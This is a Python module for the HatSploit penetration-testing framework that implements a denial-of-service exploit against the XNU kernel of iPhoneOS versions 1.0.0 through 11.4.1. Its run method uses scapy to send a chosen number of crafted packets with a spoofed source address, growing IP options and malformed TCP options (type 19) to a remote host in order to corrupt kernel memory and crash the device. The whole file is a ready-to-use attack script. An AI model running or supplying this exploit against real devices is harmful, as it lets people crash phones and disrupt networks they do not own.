#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import scapy.all

from hatsploit.lib.module import Module


class HatSploitModule(Module):
    details = {
        'Name': "iPhoneOS XNU Memory Corruption DoS",
        'Module': "exploit/iphoneos/xnu/memory_corruption_dos",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Kevin Backhouse (kevinbackhouse) -  vulnerability researcher'
        ],
        'Description': "iPhoneOS 1.0.0 till 11.4.1 XNU kernel memory corruption DoS.",
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'PACKETS': {
            'Description': "Amount of packets.",
            'Value': 15,
            'Type': "integer",
            'Required': True
        }
    }

    def run(self):
        remote_host, packets = self.parse_options(self.options)

        self.output_process(f"Performing DoS attack on {remote_host}...")
        payload = ""
        for number in range(int(packets)):
            payload += "x"

            self.output_multi(f"Sending packets... ({str(number)}/{packets})")
            scapy.all.send(scapy.all.IP(
                src="10.10.10.10",
                dst=remote_host,
                options=payload
            ) / scapy.all.TCP(options=[(19, "x"*18), (19, "x"*18)]), verbose=False)

        self.output_success("DoS attack successfully completed!")
